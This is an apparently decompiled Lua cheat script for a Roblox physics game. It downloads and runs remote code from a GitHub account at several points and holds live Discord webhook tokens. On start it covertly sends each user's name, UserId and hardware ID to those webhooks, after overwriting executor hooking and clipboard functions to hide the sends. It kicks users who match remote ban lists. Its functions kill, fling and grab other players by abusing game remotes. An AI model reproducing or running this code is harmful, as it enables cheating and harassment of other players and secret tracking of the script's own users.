
print("start")
loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/myiy"))()
local vu1 = {
    Players = game:GetService("Players"),
    RS = game:GetService("ReplicatedStorage"),
    RSs = game:GetService("RunService"),
    w = game:GetService("Workspace"),
    r = game:GetService("RunService"),
    d = game:GetService("Debris"),
    HS = game:GetService("HttpService"),
    UIS = game:GetService("UserInputService"),
    StarterGui = game:GetService("StarterGui")
}
local v2 = vu1.Players.LocalPlayer
local v3 = v2.PlayerGui.ControlsGui.PCFrame
local v4 = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/Premium"))()
local v5 = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/BAN"))()
local v6 = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/BANid"))()
local vu7 = {
    Events = {
        saymsg = vu1.RS.DefaultChatSystemChatEvents.SayMessageRequest,
        getmsg = vu1.RS.DefaultChatSystemChatEvents.OnMessageDoneFiltering,
        DestroyToyEvent = vu1.RS.MenuToys.DestroyToy,
        SetLineColorEvent = vu1.RS.DataEvents.UpdateLineColorsEvent,
        ExtendLineEvent = vu1.RS.GrabEvents.ExtendGrabLine,
        CreateGrabEvent = vu1.RS.GrabEvents.CreateGrabLine,
        StruggleEvent = vu1.RS.CharacterEvents.Struggle,
        StickyPartEvent = vu1.RS.PlayerEvents.StickyPartEvent,
        BombEvent = vu1.RS.BombEvents.BombExplode,
        DestroyGrabLineEvent = vu1.RS.GrabEvents.DestroyGrabLine,
        SetNetworkOwnerEvent = vu1.RS.GrabEvents.SetNetworkOwner,
        Ragdoll = vu1.RS.CharacterEvents.RagdollRemote,
        SpawnToyEvent = vu1.RS.MenuToys.SpawnToyRemoteFunction
    },
    me = vu1.Players.LocalPlayer,
    myname = v2.Name,
    mouse = v2:GetMouse(),
    BeingHeld = v2.IsHeld,
    pccontrol = v2.PlayerGui.ControlsGui.PCFrame,
    pccontroltoy = v3.ToyMenu,
    backpack = vu1.w[v2.Name .. "SpawnedInToys"],
    m = vu1.w.Map,
    SL = vu1.w.SpawnLocation,
    ccc = vu1.w.Camera:FindFirstChild("ColorCorrection"),
    sunrays = nil
}
local vu8 = {
    V = {
        mhv3 = Vector3.new(math.huge, math.huge, math.huge),
        nv3 = Vector3.new(0, 0, 0)
    },
    C1 = {
        Color3.fromRGB(0, 0, 0),
        Color3.fromRGB(0, 255, 0),
        Color3.fromRGB(255, 255, 0),
        Color3.fromRGB(255, 0, 0)
    },
    C2 = {
        Color3.fromRGB(0, 255, 255),
        Color3.fromRGB(0, 255, 0),
        Color3.fromRGB(127, 255, 0),
        Color3.fromRGB(255, 255, 0),
        Color3.fromRGB(255, 127, 0),
        Color3.fromRGB(255, 0, 0)
    },
    distallaura = 24,
    gettimefunc = 0,
    xrta = 0,
    yrta = 0,
    zrta = 0,
    chal = 0,
    cdyat = 0,
    zoombindv = 0,
    chamsot = 0,
    chamsft = 0,
    RawStep2 = 0,
    step2 = 0,
    hpa = 0,
    dpa = 0,
    cpan = 0,
    cpa = 0,
    hta = 0,
    dta = 0,
    RawStep = 0,
    step = 0,
    cat = 0,
    zgv = 0,
    ks = 10,
    last_UTP = 0,
    strength = 0,
    Lag_Intensity = 0,
    kickcountc = 0,
    wss = 0,
    jps = 0,
    gs = 0,
    linecolorscount = 0,
    debug = 4
}
local vu9 = {
    publicds = false,
    spyenabled = false,
    public = false,
    zoombind = false,
    gluegrab = false,
    controltrain = false,
    hidealltoys = false,
    shadowalltoys = false,
    storeallplayerstoys = false,
    vhsows = false,
    debug = false,
    tptoyfs = false,
    spyallplrinfo = true,
    paitd = false
}
local vu10 = {
    executedweb = "https://discord.com/api/webhooks/1311689856732106932/iSk3txzB_bIMqIbL1mB3ND3WA0FNpbxszGM1fFxkkMUt_xUIi64b3cPD2P0sVl8uouIL",
    chatspyweb = "https://discord.com/api/webhooks/1311690431674716190/r1QUxoS6wq2ISuSJnNt5-tDkRluiSkXNrIOBuN0dWbjSMQ_Okn-W69fBMbXTTkd-54eh",
    playerinfoweb = "https://discord.com/api/webhooks/1311690490508214282/5fQdG8xsmxIj_2YlciY3B3pBwAGWKQ_pv9LiQd6i0vncDOHTVtImHgZQxnRqTt1sgV_J",
    kicksweb = "https://discord.com/api/webhooks/1311690551602577428/f-ur915dpOhBfPbpdfevi7xJHGrMctqb57Gdp9Fe_M5xyMxHVHFYSDF6rx7qyRdch1lF",
    dataweb = "https://discord.com/api/webhooks/1311690604190629908/d6XPef_HgJn5CZTwsJEzvJkbk9Q3EWnVnlwZW2hGCkvo-qkc2DaUPMMeAKSIY_kJoyzf",
    bansweb = "https://discord.com/api/webhooks/1311690656040878112/X1q46-3K47D46gYjnHhPaVCvLgTxN9PuYaqbbgGaxzCPxBIa4lnLydZpnmvaXKxUjObA",
    name = vu7.me.DisplayName .. " (" .. vu7.myname .. ")"
}
local vu11 = {
    gkblob = nil,
    who = nil,
    lplr = nil,
    rplr = nil,
    whll = nil,
    last_toy = nil,
    last_model = nil,
    last_chto = nil,
    last_chto2 = nil,
    spat = nil,
    tptoypos = CFrame.new(363.534424, - 7.35040426, 527.307678, 0.425311029, 3.02851468e-8, - 0.905047238, 8.34827762e-9, 1, 3.73856288e-8, 0.905047238, - 2.34561064e-8, 0.425311029)
}
local vu12 = {
    admins = {
        osnova = 959216740,
        tvink = 5516434780,
        friz = 2311784954,
        friz1 = 6192858983,
        friz2 = 7427155484,
        llocal = 16183926320,
        def = 7206435394,
        range = 4645155948,
        foras = 452708414,
        range1 = 3692399888,
        kyiko = 3148914248
    },
    lat = {},
    hui = {},
    hui2 = {},
    ggl = {},
    ccolors = {},
    privateProperties = {
        Color = Color3.fromRGB(255, 0, 0),
        Font = Enum.Font.SourceSansBold,
        TextSize = 18
    },
    last_urls = {},
    spylist = {},
    sspylist = {},
    ftapcolors = {
        Coins = Color3.fromRGB(0, 0, 0),
        TabBar = Color3.fromRGB(0, 0, 0),
        Settings = Color3.fromRGB(66, 66, 66),
        Shop = Color3.fromRGB(0, 0, 0),
        ToyDestroy = Color3.fromRGB(0, 0, 0),
        ToysShop = Color3.fromRGB(0, 0, 0),
        Toys = Color3.fromRGB(0, 0, 0),
        SettingsContents = Color3.fromRGB(90, 90, 90),
        SettingsTitle = Color3.fromRGB(66, 66, 66),
        ShopTitle = Color3.fromRGB(66, 66, 66),
        ShopContents = Color3.fromRGB(90, 90, 90),
        ToysContents = Color3.fromRGB(90, 90, 90),
        FavoritesFrame = Color3.fromRGB(120, 120, 120),
        Favorites = Color3.fromRGB(66, 66, 66),
        MeterFrame = Color3.fromRGB(120, 120, 120),
        SortingTabs = Color3.fromRGB(120, 120, 120),
        ToysTitle = Color3.fromRGB(66, 66, 66),
        DestroyTitle = Color3.fromRGB(66, 66, 66),
        DestroyContents = Color3.fromRGB(90, 90, 90),
        DestroyMeterFrame = Color3.fromRGB(120, 120, 120),
        ToyShopTitle = Color3.fromRGB(66, 66, 66),
        ToyShopSortingTabs = Color3.fromRGB(120, 120, 120),
        ToyShopContents = Color3.fromRGB(90, 90, 90)
    }
}
local vu13 = {
    field = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/myfield"))(),
    ppl = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/Premium"))(),
    bpl = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/BAN"))(),
    bplid = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/BANid"))(),
    bpltag = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/bantag"))(),
    ldsp = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/Premium"))(),
    ldsb = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/BAN"))(),
    ldsbip = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/BANid"))(),
    lastb = v4,
    lastc = v5,
    lastd = v6
}
local v14 = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = v14
local vu15 = Color3.fromRGB(255, 255, 255)
local vu16 = Color3.fromRGB(0, 0, 0)
local function v17()
end
local vu18 = 0
local v19 = vu7.me.PlayerGui.Chat.Frame
typingAnimation = Instance.new("Animation")
typingAnimation.AnimationId = "rbxassetid://18353618958"
typingAnimator = vu7.me.Character:WaitForChild("Humanoid"):WaitForChild("Animator")
typingTrack = typingAnimator:LoadAnimation(typingAnimation)
crouchAnimation = Instance.new("Animation")
crouchAnimation.AnimationId = "rbxassetid://6980229055"
crouchAnimator = vu7.me.Character:WaitForChild("Humanoid"):WaitForChild("Animator")
crouchTrack = crouchAnimator:LoadAnimation(crouchAnimation)
throwedAnimation = Instance.new("Animation")
throwedAnimation.AnimationId = "rbxassetid://7047322890"
throwedAnimator = vu7.me.Character:WaitForChild("Humanoid"):WaitForChild("Animator")
throwedTrack = throwedAnimator:LoadAnimation(throwedAnimation)
vu7.m.Hole.PoisonBigHole.PoisonHurtPart.Size = Vector3.new(2, 2, 2)
vu7.m.Hole.PoisonSmallHole.PoisonHurtPart.Size = Vector3.new(2, 2, 2)
vu7.m.FactoryIsland:FindFirstChild("PoisonContainer").Name = "fff"
vu7.m.FactoryIsland.PoisonContainer.PoisonHurtPart.Size = Vector3.new(2, 2, 2)
vu7.m.FactoryIsland.fff.PoisonHurtPart.Size = Vector3.new(2, 2, 2)
vu7.m.AlwaysHereTweenedObjects.InnerUFO.Object.ObjectModel.PaintPlayerPart.Size = Vector3.new(2, 2, 2)
game.Lighting.FogEnd = 1000000000000
game.Lighting.Sky.StarCount = 5000
game.Lighting.ShadowSoftness = 1
game.Lighting.Sky.SkyboxBk = "rbxassetid://1289067181"
game.Lighting.Sky.SkyboxDn = "rbxassetid://1289084895"
game.Lighting.Sky.SkyboxFt = "rbxassetid://1289065660"
game.Lighting.Sky.SkyboxLf = "rbxassetid://1289065992"
game.Lighting.Sky.SkyboxRt = "rbxassetid://1289066325"
game.Lighting.Sky.SkyboxUp = "rbxassetid://1289076870"
game.Lighting.Sky.SunTextureId = "rbxasset://sky/sun.jpg"
game.Lighting.Sky.MoonTextureId = "rbxasset://sky/moon.jpg"
vu7.sunrays = Instance.new("SunRaysEffect", game.Lighting)
vu7.sunrays.Intensity = 0
vu7.sunrays.Spread = 0
vu7.bloomeffect = Instance.new("BloomEffect", game.Lighting)
vu7.bloomeffect.Intensity = 0
vu7.bloomeffect.Size = 0
vu7.bloomeffect.Threshold = 0
vu7.ccc = Instance.new("ColorCorrectionEffect", vu1.w.Camera)
vu7.ccc.Enabled = false
Instance.new("Folder", vu1.w)
vu1.w.Folder.Name = "hls"
v19.ChatChannelParentFrame.Visible = true
v19.ChatBarParentFrame.Position = v19.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), v19.ChatChannelParentFrame.Size.Y)
pst = true
local function _(p20)
    local v21 = ""
    local v22 = {
        "0",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9"
    }
    local v23 = {
        "a",
        "b",
        "c",
        "d",
        "e",
        "f",
        "g",
        "h",
        "i",
        "j",
        "k",
        "l",
        "O.m",
        "n",
        "o",
        "p",
        "q",
        "r",
        "s",
        "t",
        "u",
        "v",
        "w",
        "x",
        "y",
        "z",
        "A",
        "B",
        "C",
        "D",
        "E",
        "F",
        "G",
        "H",
        "I",
        "J",
        "K",
        "L",
        "M",
        "N",
        "O",
        "P",
        "Q",
        "R",
        "S",
        "T",
        "U",
        "V",
        "W",
        "X",
        "Y",
        "Z"
    }
    local v24 = {
        "-",
        "_"
    }
    for _ = 1, p20 do
        local v25 = math.random(1, 3)
        if v25 == 1 then
            v21 = v21 .. v24[math.random(1, # v24)]
        elseif v25 == 2 then
            v21 = v21 .. v23[math.random(1, # v23)]
        else
            v21 = v21 .. v22[math.random(1, # v22)]
        end
    end
    return v21
end
local function _(p26)
    local v27 = ""
    local v28 = {
        "0",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9"
    }
    for _ = 1, p26 do
        v27 = v27 .. v28[math.random(1, # v28)]
    end
    return v27
end
local vu32 = (function(p29)
    return setmetatable({
        func = p29
    }, {
        __index = function(_, p30)
            if p30 == "hook" then
                error("Hooking is not allowed", 2)
            end
        end,
        __newindex = function(_, p31, _)
            if p31 == "hook" then
                error("Hooking is not allowed", 2)
            end
        end,
        __metatable = "protected"
    })
end)(function()
    if plt then
        plt = false
        vu13.ppl = loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/Premium"))()
        task.wait(1)
        plt = true
    end
end).func
local function v39(p33)
    vu32()
    local v34, v35, v36 = pairs(vu13.ppl)
    local v37 = true
    while true do
        local v38
        v36, v38 = v34(v35, v36)
        if v36 == nil then
            break
        end
        if p33 == v38 then
            v37 = false
            break
        end
    end
    return v37
end
local function _(p40, p41, p42)
    return p40 == p41 or p40 == p42
end
local function vu46(p43, p44)
    local v45 = {
        Url = p43,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = p44
    }
    request(v45)
end
local function vu49(p47, p48)
    vu46(p47, (vu1.HS:JSONEncode(p48)))
end
local function vu52(p50, p51)
    getgenv().rconsoletitle = nil
    getgenv().rconsoleprint = nil
    getgenv().rconsolewarn = nil
    getgenv().rconsoleinfo = nil
    getgenv().rconsolerr = nil
    getgenv().printconsole = nil
    getgenv().gcinfo = 9000000000
    getgenv().clonefunction = function()
    end
    getgenv().hookfunction = function()
    end
    getgenv().hookmetamethod = function()
    end
    getgenv().setclipboard = nil
    vu49(p50, p51)
end
local function vu55(p53, p54)
    vu52(p53, {
        content = p54,
        username = vu10.name
    })
end
vu13.field:Notify({
    Title = "Loading...",
    Content = "Loading...",
    Duration = 15
})
vu52(vu10.executedweb, {
    content = "\239\191\189\209\128\209\131\208\182\209\131\209\129\209\140/I\'O.m loading up",
    username = vu7.me.DisplayName .. " (" .. vu7.myname .. ")"
})
vu52(vu10.playerinfoweb, {
    content = vu7.me.DisplayName .. " " .. vu7.me.Name .. " " .. vu7.me.UserId .. " " .. vu7.me.FollowUserId .. " " .. gethwid()
})
local vu56 = vu9.vhsows and function()
    return true
end or v39
local v57, v58, v59 = pairs(vu1.w.Plots:GetDescendants())
local vu60 = vu52
while true do
    local v61, v62 = v57(v58, v59)
    if v61 == nil then
        break
    end
    v59 = v61
    if v62.Name == "PlotBarrier" or v62.Name == "PlotArea" then
        v62.CanQuery = false
        v62.CanCollide = false
    end
end
local v63, v64, v65 = ipairs(vu1.Players:GetPlayers())
while true do
    local v66
    v65, v66 = v63(v64, v65)
    if v65 == nil then
        break
    end
    v66.CharacterAdded:Connect(v17())
end
for _ = 1, 20 do
    table.insert(vu12.ccolors, Color3.fromRGB(0, 0, 0))
end
local v67, v68, v69 = ipairs(vu1.Players:GetPlayers())
while true do
    local v70, v71 = v67(v68, v69)
    if v70 == nil then
        break
    end
    v69 = v70
    if v71 ~= vu7.me and (v71.InPlot == true and vu56(v71.Name)) then
        task.wait()
        vu1.w.PlotItems.PlayersInPlots[v71].Parent = w
    end
end
local v72, v73, v74 = pairs(vu13.bpltag)
while true do
    local v75, v76 = v72(v73, v74)
    if v75 == nil then
        break
    end
    v74 = v75
    if vu7.me.Name:find(v75) or vu7.me.DisplayName:find(v75) then
        vu7.me:Kick("A banned clan tag has been found in your nickname: " .. v75 .. ", log out of the clan or change your nickname to continue using the script, Message: " .. v76)
        vu60(vu10.bansweb, {
            content = "\239\191\189\209\130\208\187\208\181\209\130\208\181\208\187 \208\183\208\176 " .. v75 .. "/ban for " .. v75,
            username = vu7.me.DisplayName .. " (" .. vu7.myname .. ")" .. " \226\153\165" .. vu7.me.UserId .. "\239\191\189\239\191\189"
        })
    end
end
local v77, v78, v79 = pairs(vu13.bpl)
while true do
    local v80, v81 = v77(v78, v79)
    if v80 == nil then
        break
    end
    v79 = v80
    if vu7.myname == v81 then
        vu7.me:Kick("BAN")
        vu60(vu10.bansweb, {
            content = "\239\191\189\209\130\208\187\208\181\209\130\208\181\208\187/ban." .. gethwid(),
            username = vu7.me.DisplayName .. " (" .. vu7.myname .. ")" .. " \226\153\165" .. vu7.me.UserId .. "\239\191\189\239\191\189"
        })
    end
end
local v82, v83, v84 = pairs(vu13.bplid)
while true do
    local v85, v86 = v82(v83, v84)
    if v85 == nil then
        break
    end
    v84 = v85
    if vu7.me:IsFriendsWith(v86) then
        vu7.me:Kick("You have a banned user as a friend, remove " .. v85 .. " from friends to continue using the script")
        vu60(vu10.bansweb, {
            content = "\239\191\189\209\130\208\187\208\181\209\130\208\181\208\187 \208\183\208\176 " .. v85 .. "/ban for " .. v85,
            username = vu7.me.DisplayName .. " (" .. vu7.myname .. ")" .. " \226\153\165" .. vu7.me.UserId .. "\239\191\189\239\191\189"
        })
    end
end
local function vu87()
end
local function vu88()
end
local function vu89()
end
local function vu90()
end
local function vu91()
end
local function vu93(p92)
    print(p92)
    vu13.field:Notify({
        Title = "Function Status",
        Content = p92,
        Duration = 5,
        Image = 4483362458
    })
end
local function vu96(p94, p95)
    if vu9.debug and vu8.debug == p95 then
        vu13.field:Notify({
            Title = "Debug",
            Content = p94,
            Duration = 5,
            Image = 4483362458
        })
    end
end
local function vu98(p97)
    print(p97)
    vu13.field:Notify({
        Title = "Notify",
        Content = p97,
        Duration = 5,
        Image = 4483362458
    })
end
local function vu101(p99, p100)
    return (p99.Position - p100.Position).Magnitude
end
local function vu103(p102)
    return {
        R = p102.R * 255,
        G = p102.G * 255,
        B = p102.B * 255
    }
end
local function v105(p104)
    return Color3.fromRGB(p104.R, p104.G, p104.B)
end
local function vu112(p106, p107)
    local v108, v109, v110 = pairs(p106)
    while true do
        local v111
        v110, v111 = v108(v109, v110)
        if v110 == nil then
            break
        end
        if v111 == p107 then
            return v111
        end
    end
end
local function vu114(p113)
    return vu112({
        "Head",
        "Right Arm",
        "Right Leg",
        "Left Arm",
        "Left Leg",
        "Torso",
        "FirePlayerPart",
        "HumanoidRootPart"
    }, p113.Name)
end
local function vu116(p115)
    if p115 and (p115.Health ~= 0 and p115:GetState() ~= Enum.HumanoidStateType.Dead) then
        return true
    end
end
local function vu118(p117)
    vu112(vu12.spylist, p117)
    return vu112(vu12.sspylist, p117)
end
local function vu120(p119)
    return not vu112(vu11.whll, p119)
end
local function vu123(p121, p122)
    if vu101(p121, p122) < 25 then
        return true
    end
end
local function vu126(p124, p125)
    if vu101(p124, p125) > 25 then
        return true
    end
end
local function vu128(p127)
    return vu112(vu12.admins, p127)
end
local function vu137(p129, p130)
    local v131, v132, v133, v134, v135, v136 = vu90(p129)
    if v131 and (v132 and (vu116(v132) and (v133 and (v134 and (v135 and (vu116(v135) and (v136 and not vu91(p129).InPlot.Value))))))) and (not p130 or vu123(v131, v134)) then
        return v131, v132, v133, v134, v135, v136
    end
end
local function vu144(p138)
    local v139, v140, v141 = pairs(p138)
    local v142 = nil
    while true do
        local v143
        v141, v143 = v139(v140, v141)
        if v141 == nil then
            break
        end
        v142 = v143
    end
    return v142
end
local function vu151(p145)
    local v146, v147, v148 = pairs(p145)
    local v149 = nil
    while true do
        local v150
        v148, v150 = v146(v147, v148)
        if v148 == nil then
            break
        end
        v149 = v148
    end
    return v149
end
local function vu159(p152)
    local v153 = vu151(p152)
    local v154, v155, v156 = pairs(p152)
    local v157 = {}
    while true do
        local v158
        v156, v158 = v154(v155, v156)
        if v156 == nil then
            break
        end
        v157[v153 - v156 + 1] = v158
    end
    return v157
end
local function vu162(p160)
    local v161 = {
        p160
    }
    while p160 ~= game do
        p160 = p160.Parent
        table.insert(v161, p160)
    end
    return v161
end
local function vu169(p163)
    if p163 then
        local v164, v165, v166 = ipairs(vu1.Players:GetPlayers())
        while true do
            local v167
            v166, v167 = v164(v165, v166)
            if v166 == nil then
                break
            end
            local v168 = nil
            if p163 == v167 then
                return v167.Character
            end
            if v167.Character then
                v168 = vu112(vu162(p163), v167.Character)
            end
            if v168 then
                return v168
            end
        end
    end
end
vu91 = function(p170)
    local v171 = vu169(p170)
    local v172, v173, v174 = ipairs(Players:GetPlayers())
    while true do
        local v175
        v174, v175 = v172(v173, v174)
        if v174 == nil then
            break
        end
        if v175.Character and v175.Character == v171 then
            return v175
        end
    end
end
local function vu179(p176, p177)
    local v178 = vu169(p176)
    if v178 and v178:FindFirstChild(p177) then
        return v178[p177]
    end
end
local function vu182(p180)
    local v181 = vu7.me.Character
    if v181 and v181:FindFirstChild(p180) then
        return v181[p180]
    end
end
local function vu183()
    return vu182("HumanoidRootPart")
end
local function vu184()
    return vu182("Humanoid")
end
local function vu185()
    return vu182("Head")
end
local function vu187(p186)
    return vu179(p186, "HumanoidRootPart")
end
local function vu189(p188)
    return vu179(p188, "Humanoid")
end
local function vu191(p190)
    return vu179(p190, "Head")
end
local function vu192()
    return vu183(), vu184(), vu185()
end
vu90 = function(p193)
    return vu183(), vu184(), vu185(), vu187(p193), vu189(p193), vu191(p193)
end
local function vu199(p194)
    local v195, v196, v197 = pairs(p194:GetChildren())
    while true do
        local v198
        v197, v198 = v195(v196, v197)
        if v197 == nil then
            break
        end
        if v198:IsA("Part") and v198.CanQuery then
            return v198
        end
    end
end
local function vu205(p200)
    local v201, v202, v203 = pairs(p200:GetChildren())
    while true do
        local v204
        v203, v204 = v201(v202, v203)
        if v203 == nil then
            break
        end
        if v204:FindFirstChild("PartOwner") then
            return v204.PartOwner
        end
    end
end
local function vu213(p206)
    local v207 = vu159(p206)
    local v208, v209, v210 = pairs(v207)
    local v211 = ""
    while true do
        local v212
        v210, v212 = v208(v209, v210)
        if v210 == nil then
            break
        end
        if v210 ~= vu151(v207) then
            v211 = v211 .. tostring(v212) .. "."
        end
    end
    return v211 .. tostring(vu144(v207))
end
local function vu215(p214)
    vu7.Events.SetNetworkOwnerEvent:FireServer(p214, p214.CFrame)
end
local function vu218(p216, p217)
    vu7.Events.SpawnToyEvent:InvokeServer(p216, p217, Vector3.new(0, 0, 0))
end
local function vu220(p219)
    vu218(p219, vu182("HumanoidRootPart").CFrame)
end
local function vu223(p221)
    local v222 = vu182("HumanoidRootPart").CFrame
    vu218(p221, v222 - Vector3.new(v222.LookVector.X * 20, - 15, v222.LookVector.Z * 20))
end
local function vu225(p224)
    vu7.Events.DestroyToyEvent:FireServer(p224)
end
local function vu229(p226, p227, p228)
    vu7.Events.BombEvent:FireServer(unpack({
        {
            Hitbox = p226,
            PositionPart = p227
        },
        p228
    }))
end
local function vu234(p230, p231, p232)
    local v233 = Instance.new("BoolValue", p230)
    v233.Value = p232
    v233.Name = p231
    return v233
end
local function vu239(p235, p236, p237)
    local v238 = Instance.new("StringValue", p235)
    v238.Value = p237
    v238.Name = p236
    return v238
end
local function vu246(p240, p241, p242, p243, p244)
    local v245 = Instance.new("BodyPosition", p240)
    v245.Name = p241
    v245.MaxForce = p242
    v245.D = p244
    if p243 then
        v245.Position = p243
    end
    return v245
end
local function vu253(p247, p248, p249, p250, p251)
    local v252 = Instance.new("BodyGyro", p247)
    v252.Name = p248
    v252.MaxTorque = p249
    v252.D = p250
    if p251 then
        v252.CFrame = p251
    end
    return v252
end
local function vu262(p254, p255, p256, p257, p258, p259, p260)
    local v261 = Instance.new("Highlight", p254)
    v261.Name = p256
    v261.OutlineTransparency = p257
    v261.FillTransparency = p258
    v261.OutlineColor = p259
    v261.FillColor = p260
    v261.Adornee = p255
    return v261
end
local function vu269(p263, p264)
    local v265, v266, v267 = pairs(p264)
    while true do
        local v268
        v267, v268 = v265(v266, v267)
        if v267 == nil then
            break
        end
        while not p263:FindFirstChild(v268) do
            task.wait()
        end
        p263 = p263[v268]
    end
    return p263
end
local function vu271(p270)
    vu7.me:Kick("\239\191\189\208\184\208\186\208\189\209\131\209\130 \209\128\208\176\208\183\209\128\208\176\208\177\208\190\208\188 \209\129\208\186\209\128\208\184\208\191\209\130\208\176/kicked by the script developer, \208\161\208\190\208\190\208\177\209\137\208\181\208\189\208\184\208\181/Message: " .. p270)
    vu55(vu10.bansweb, p270)
end
local function vu273(p272)
    if not vu9.vhsows then
        vu271(p272)
    end
end
local function vu275(p274)
    if not (vu9.vhsows and vu128(vu7.me.UserId)) then
        vu271(p274)
    end
end
local function vu281(p276, p277)
    local v278, _, _, v279, _, v280 = vu137(p276, p277)
    if v278 then
        vu87(v280, v278)
        vu215(v280)
        for _ = 1, 100 do
            v279.CFrame = v279.CFrame + Vector3.new(0, - 1000, 0)
            task.wait(0.1)
        end
    end
end
local function vu287(p282, p283)
    local v284, _, _, _, v285, v286 = vu137(p282, p283)
    if v284 then
        vu87(v286, v284)
        v285.Health = 0
    end
end
local function vu294(p288, p289)
    local v290, _, _, v291, _, v292 = vu137(p288, p289)
    if v290 then
        vu87(v292, v290)
        if not v291:FindFirstChild("pfbv") then
            local vu293 = Instance.new("BodyVelocity", v291)
            vu293.MaxForce = vu8.V.mhv3
            vu293.Name = "pfbv"
            vu293.Velocity = Vector3.new(0, 100000000000, 0)
            v292.PartOwner.AncestryChanged:Connect(function()
                vu293:Destroy()
            end)
        end
    end
end
local function vu299(p295, p296)
    local v297, _, _, _, _, v298 = vu137(p295, p296)
    if v297 then
        vu87(v298, v297)
    end
end
local function vu307(p300, p301)
    local v302, _, _, v303, _, v304 = vu137(p300, p301)
    if v302 then
        vu87(v304, v302)
        local v305 = v303.Position
        local v306 = vu246(v303, "bp", vu8.V.mhv3, v303.Position + Vector3.new(0, 1000, 0), 100)
        task.wait(0.1)
        v306.Position = v305 + Vector3.new(0, - 10, 0)
        task.wait(0.1)
        v306.Position = v305
        task.wait(0.1)
        v306:Destroy()
        task.wait(0.1)
    end
end
local function vu314(p308, p309)
    local v310, _, _, vu311, _, v312 = vu137(p308, p309)
    if v310 and not v312:FindFirstChild("spited") then
        vu234(v312, "spited", true)
        vu307(p308, p309)
        local vu313 = vu311.Parent.Torso
        vu313.Parent = vu1.RS
        v312.PartOwner.Destroying:Connect(function()
            vu313.Parent = vu311.Parent
        end)
    end
end
vu87 = function(pu315, pu316, pu317, pu318, p319, p320)
    if pu315 and pu316 then
        local v321 = pu315:FindFirstChild("igrab")
        local vu322 = pu315:FindFirstChild("PartOwner")
        local v323 = pu315:FindFirstChild("whograb")
        if not v323 then
            local vu324 = vu239(pu315, "whograb", "")
            pu315.ChildAdded:Connect(function(p325)
                if p325.Name == "PartOwner" then
                    vu324.Value = p325.Value
                end
            end)
            v323 = vu324
        end
        local function v330()
            vu89(pu317, "FillColor", pu318, 3)
            local v326 = pu316.CFrame
            local v327 = false
            local vu328 = pu315.Position
            task.spawn(function()
                while (not vu322 or vu322.Value ~= vu7.myname) and (task.wait(0.1) and (pu315.Parent and pu316.Parent)) do
                    if vu116(pu316.Parent.Humanoid) and vu328 ~= pu315.Position then
                        vu328 = pu315.Position
                    end
                end
            end)
            local v329 = vu328
            while (not vu322 or vu322.Value ~= vu7.myname) and (task.wait() and (pu315.Parent and pu316.Parent)) do
                if vu116(pu316.Parent.Humanoid) then
                    if vu126(pu315, pu316) then
                        vu89(pu317, "FillColor", pu318, 4)
                        pu316.CFrame = pu315.CFrame + (pu315.Position - v329) * vu7.me:GetNetworkPing() * 100
                        vu215(pu315)
                        v327 = true
                    else
                        vu215(pu315)
                    end
                else
                    vu89(pu317, "FillColor", pu318, 5)
                end
                vu322 = pu315:FindFirstChild("PartOwner")
            end
            if v327 then
                pu316.CFrame = v326
            end
            vu89(pu317, "FillColor", pu318, 1)
        end
        if v323.Value ~= vu7.me.Name then
            v330()
        end
        if v321 then
            vu89(pu317, "FillColor", pu318, 2)
            while true do
                local v331 = pu315
                if pu315.FindFirstChild(v331, "PartOwner") then
                    break
                end
                task.wait()
            end
            p319.MaxForce = vu8.V.nv3
            p320.MaxTorque = vu8.V.nv3
            while v321.Parent do
                task.wait()
            end
            p319.Position = pu315.Position
            p320.CFrame = pu315.CFrame
            p319.MaxForce = vu8.V.mhv3
            p320.MaxTorque = vu8.V.mhv3
            vu89(pu317, "FillColor", pu318, 1)
        end
    end
end
local function vu337(_, p332, p333, p334, p335, p336)
    vu87(vu269(vu169, {
        "Head"
    }), p332, p333, p334, p335, p336)
end
local function vu349(pu338, pu339, p340, p341, p342, p343)
    if pu338 and (pu339 and (pu338:IsA("Part") and pu338.CollisionGroup == "Items")) then
        if vu114(pu338.Name) then
            vu337(pu338, pu339, p340, p341, p342, p343)
        else
            local v344 = pu338:FindFirstChild("PartOwner")
            local v345 = pu339.CFrame
            local v346 = false
            local vu347 = pu338.Position
            task.spawn(function()
                while t3 and (task.wait(0.1) and (pu338.Parent and pu339.Parent)) do
                    if vu116(pu339.Parent.Humanoid) and vu347 ~= pu338.Position then
                        vu347 = pu338.Position
                    end
                end
            end)
            if not v344 or v344.Value ~= vu7.myname then
                local v348 = vu347
                while (not v344 or v344.Value ~= vu7.myname) and (task.wait() and (pu338.Parent and pu339.Parent)) do
                    if vu116(pu339.Parent.Humanoid) then
                        if vu126(pu338, pu339) then
                            pu339.CFrame = pu338.CFrame + (pu338.Position - v348) * vu7.me:GetNetworkPing() * 100
                            v346 = true
                        else
                            vu215(pu338)
                        end
                    end
                    v344 = vu205(pu338.Parent)
                end
                if v346 then
                    pu339.CFrame = v345
                end
            end
        end
    end
end
local function vu357(p350)
    if not p350:FindFirstChild("ait") then
        local v351 = Instance.new("ObjectValue", p350)
        v351.Name = "ait"
        local v352 = Instance.new("Highlight", vu1.w.hls)
        v352.FillColor = Color3.fromRGB(255, 0, 255)
        v352.OutlineColor = Color3.fromRGB(255, 0, 0)
        v352.FillTransparency = 0.5
